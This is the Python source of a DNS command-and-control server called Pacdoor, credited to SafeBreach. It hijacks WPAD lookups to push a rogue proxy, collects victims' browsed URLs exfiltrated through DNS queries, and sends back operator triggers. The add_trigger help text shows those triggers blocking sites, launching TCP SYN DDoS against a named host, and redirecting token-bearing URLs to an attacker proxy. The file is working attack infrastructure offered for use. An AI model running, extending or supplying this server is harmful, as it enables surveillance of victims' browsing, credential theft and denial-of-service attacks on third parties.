#!/usr/bin/env python
# Copyright (c) 2016, SafeBreach
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import argparse
import sys
import dnslib
import dnslib.server
import cmd
import prettytable
import os
import textwrap
import struct
import termios
import fcntl
import re
import shlex

####################
# Global Variables #
####################

__version__ = "1.0"
__author__ = "Itzik Kotler"
__copyright__ = "Copyright 2016, SafeBreach"

hits = []
live_mode = 0
triggers = []


###########
# Classes #
###########

class CNCConsole(cmd.Cmd):

    ############
    # Commands #
    ############

    def do_list_clients(self, line):
        """List all captured clients"""
        global hits
        print self._gen_simple_tbl(hits, ["SOURCE IP", "SOURCE PORT", "PROTOCOL"])

    def do_list_urls(self, line):
        """List all captured URLs"""
        global hits
        print self._gen_urls_tbl(hits)

    def do_search_urls(self, line):
        """Regexp Search\nUsage: search_urls <REGEXP> (default: ".*")\n"""
        global hits
        try:
            pattern = ".*"
            if line:
                if line.startswith('"'):
                    pattern = line[1:-1]
                else:
                    pattern = line
            results = []
            for hit in hits:
                if re.match(pattern, hit[3]):
                    results.append(hit)
            print self._gen_urls_tbl(results)[:-1]
            print "Pattern: \"%s\"\n" % (pattern)
        except Exception as e:
            print "ERROR %s: %s" % (line, str(e))

    def do_exit(self, line):
        """Shutdown the C&C Server"""
        return True

    def do_live(self, line):
        """Toggle/Display Live Mode\nUsage: live [<NEW MODE>]\n\nLive Values: 0 = Off; 1 = On; 2 = Debug\n"""
        global live_mode
        if not line:
            print "Live mode equal %d" % live_mode
        else:
            live_mode = int(line)
            print "Live mode now equal %d" % live_mode

    def do_list_triggers(self, line):
        """List all triggers"""
        global triggers
        print self._gen_simple_tbl(triggers, ["INDEX", "URL", "ACTION", "ACTION ARG"])

    def do_add_trigger(self, line):
        """Add trigger\nUsage: add_trigger <REGEXP> <ACTION> [<ACTION ARG>]\n\nAction Values: 0 = Pass; 1 = Offline; 2 = Alert Message; 3 = DDoS; 4 = Hijack\n\nExamples:
        add_trigger ".*com" 1                                      -- This will disable access to any *.COM website
        add_trigger ".*google*" 2 "Sorry, Google is closed today!" -- Display alert if trying to browse any URL that matches: *GOOGLE* Regexp
        add_trigger ".*" 3 "www.ikotler.org:80"                    -- Will start TCP SYN DDoS on http://www.ikotler.org on 80/tcp
        add_trigger ".*token*" 4 "grin.host:123"                   -- Redirect every URL contains *token* to PROXY: grin.host on 123/tcp
        """
        global triggers

        if not line:
            self.do_help("add_trigger")
        else:
            trigger_args = shlex.split(line)
            trigger_data = [len(triggers), trigger_args[0], int(trigger_args[1])]
            if trigger_args[1] == "1":
                trigger_data.append("N/A")
            else:
                trigger_data.append(trigger_args[2])
            triggers.append(trigger_data)
            print "Done!"

    def do_del_trigger(self, line):
        """Delete trigger\nUsage: del_trigger <INDEX>\n"""
        global triggers

        try:
            idx = int(line)
            if idx < 0 or idx > len(triggers):
                print "#%d is Invalid Range (Try: %d ... %d)" % (idx, 0, len(triggers))
            del triggers[idx]
            print "Deleted Trigger #%d" % idx

        except Exception:
            self.do_help("del_trigger")

    def do_EOF(self, line):
        print " "
        return True

    def emptyline(self):
        pass

    def _gen_simple_tbl(self, data, cols_headers):
        (tbl, col_max_width) = _mk_tbl(cols_headers)
        for row in data:
            tbl.add_row(row[:len(cols_headers)])
        return "\n" + tbl.get_string() + "\n"

    def _gen_urls_tbl(self, hits):
        (tbl, col_max_width) = _mk_tbl(["CLIENT", "URL"])
        for hit in hits:
            row_data = []
            row_data.append('\n'.join(textwrap.wrap(str(hit[0]) + ":" + str(hit[1]) + "/" + str(hit[2]), col_max_width)))
            row_data.append('\n'.join(textwrap.wrap(hit[3], col_max_width)))
            tbl.add_row(row_data)
        return "\n" + tbl.get_string() + "\n\n" + "Total: %d" % (len(hits)) + "\n"


class CNCOrProxy(dnslib.server.BaseResolver):

    def __init__(self,address, port, key, wpad_srv):
        self.address = address
        self.port = port
        self.buffers = {}
        self.key = key
        self.wpad_srv = wpad_srv

    def resolve(self, request, handler):
        global live_mode
        global hits
        global triggers
        reply = request.reply()
        qname = request.q.qname
        response = "200.111.111.111"

        if live_mode == 2:
            print("\n# Request: [%s:%d] (%s) / '%s' (%s)" % (
                handler.client_address[0],
                handler.client_address[1],
                handler.protocol,
                request.q.qname,
                dnslib.server.QTYPE[request.q.qtype]))

        # WPAD Request?
        if qname.matchGlob("wpad*"):
            reply.add_answer(dnslib.RR(qname,dnslib.QTYPE.A,rdata=dnslib.A(self.wpad_srv),ttl=60))
            print("\n[!] HIJACKED WPAD Request: [%s:%d] (%s) / '%s' (%s) => %s" % (
                handler.client_address[0],
                handler.client_address[1],
                handler.protocol,
                request.q.qname,
                dnslib.server.QTYPE[request.q.qtype],
                self.wpad_srv))

        elif qname.matchGlob("*." + self.key):
            # C&C Domain?
            data = str(qname)[:-1].split('.')
            op_name = data[0]
            op_id = data[1]

            ########################################
            # 'O' | <HASH> | 'TC' + <TOTAL CHUNKS> #
            ########################################

            if op_name == 'O':
                total_chunks = int(data[2][2:])
                if not self.buffers.has_key(op_id):
                    self.buffers[op_id] = {'total_chunks': total_chunks, 'chunks': {}}
                else:
                    # Dup
                    pass

            ##################################
            # 'C' | <HASH> | 'DL' + <LENGTH> #
            ##################################

            if op_name == 'C':
                try:
                    buffer = ""
                    for chunk_idx in xrange(0, self.buffers[op_id]['total_chunks']):
                        buffer += self.buffers[op_id]['chunks'][chunk_idx]
                    url = buffer.decode('base64')
                    hits.append(list(handler.client_address) + [handler.protocol, url])

                    # Trigger?
                    for trigger_idx in xrange(0, len(triggers)):
                        trigger = triggers[trigger_idx]
                        if re.match(trigger[1], url):
                            response = "%d.%d.%d.%d" % (200 + int(trigger[2]), len(trigger[3]), trigger_idx, trigger[0]+1)

                    if live_mode == 1:
                        print "\n>> %s (RESPONSE: %s)" % (url, response)

                except Exception as e:
                    pass

                finally:
                    if self.buffers.has_key(op_id):
                        del self.buffers[op_id]

            ############################################
            # 'W' | <HASH> | 'I' + <INDEX #> | <CHUNK> #
            ############################################

            if op_name == 'W':
                try:
                    chunk_idx = int(data[2][1:])
                    self.buffers[op_id]['chunks'][chunk_idx] = data[3]
                except Exception:
                    pass

            ###########################################################
            # 'R' | <HASH> | 'I' + <TRIGGER INDEX #> | 'O' + <OFFSET> #
            ###########################################################

            if op_name == 'R':
                try:
                    trigger_idx = int(data[2][1:])
                    data_offset = int(data[3][1:])
                    dword_retval = map(lambda x: str(ord(x)), triggers[trigger_idx][3][data_offset:data_offset+4])

                    # Pad it to be 32-bit
                    while len(dword_retval) != 4:
                        dword_retval.append('1')

                    response = '.'.join(dword_retval)

                except Exception as e:
                    print str(e)

            reply.add_answer(dnslib.RR(qname,dnslib.QTYPE.A,rdata=dnslib.A(response),ttl=60))

        # Otherwise proxy
        if not reply.rr:
            if handler.protocol == 'udp':
                proxy_r = request.send(self.address,self.port)
            else:
                proxy_r = request.send(self.address,self.port,tcp=True)
            reply = dnslib.DNSRecord.parse(proxy_r)

        return reply

#############
# Functions #
#############

# Taken from http://stackoverflow.com/questions/566746/how-to-get-console-window-width-in-python/566752#566752

def _ioctl_GWINSZ(fd):
    cr = None
    try:
        cr = struct.unpack('hh', fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
    except Exception:
        pass
    return cr

def terminalsize():
    cr = _ioctl_GWINSZ(0) or _ioctl_GWINSZ(1) or _ioctl_GWINSZ(2)
    if not cr:
        try:
            fd = os.open(os.ctermid(), os.O_RDONLY)
            cr = _ioctl_GWINSZ(fd)
            os.close(fd)

        except:
            try:
                cr = (os.environ['LINES'], os.environ['COLUMNS'])
            except:
                cr = (25, 80)

    return int(cr[1]), int(cr[0])


def _mk_tbl(fields):
    tbl = prettytable.PrettyTable(fields, left_padding_width=1, right_padding_width=1, hrules=prettytable.ALL)
    col_max_width = (terminalsize()[0] / len(fields)) - 5

    for k in tbl.align:
        tbl.align[k] = 'l'

    return (tbl, col_max_width)



def main(argv):

    p = argparse.ArgumentParser(description="Pacdoor DNS C&C Server")
    p.add_argument("--port","-p",type=int,default=53,
                   metavar="<PORT>",
                   help="Port to bind on (default: 53)")
    p.add_argument("--address","-a",default="",
                   metavar="<ADDRESS>",
                   help="Address to bind on (default: all)")
    p.add_argument("--upstream","-u",default="8.8.8.8:53",
                   metavar="<ADDRESS:PORT>",
                   help="Upstream DNS server:port (default: 8.8.8.8:53)")
    p.add_argument("--tcp",action='store_true',default=False,
                   help="TCP proxy (default: UDP only)")
    p.add_argument("--key","-k",default="x.com", metavar="<DOMAIN NAME>",
                   help="C&C Domain (default: x.com)")
    p.add_argument("--wpad-server", "-wsrv", default="127.0.0.1", metavar="<ADDRESS>",
                   help="Redirect WPAD.* Requests (default: 127.0.0.1)")

    args = p.parse_args()

    args.dns,_,args.dns_port = args.upstream.partition(':')
    args.dns_port = int(args.dns_port or 53)

    resolver = CNCOrProxy(args.dns,
                          args.dns_port,
                          args.key,
                          args.wpad_server)

    logger = dnslib.server.DNSLogger("-request,-reply,-truncated,-error")

    print("Starting C&C DNS. For help, type \"help\".\nProxying Requests (%s:%d -> %s:%d) [%s]" % (
        args.address or "*",args.port,
        args.dns,args.dns_port,
        "UDP/TCP" if args.tcp else "UDP"))

    udp_server = dnslib.server.DNSServer(resolver,
                           port=args.port,
                           address=args.address,
                           logger=logger)

    udp_server.start_thread()

    if args.tcp:
        tcp_server = dnslib.server.DNSServer(resolver,
                               port=args.port,
                               address=args.address,
                               tcp=True,
                               logger=logger)

        tcp_server.start_thread()

    con = CNCConsole()
    con.prompt = "[%s:%d]> " % (args.address or "*", args.port)

    # Catch Ctrl+C and Exit
    try:

        con.cmdloop()

    except KeyboardInterrupt:
        print " "
        pass


###############
# Entry Point #
###############

if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))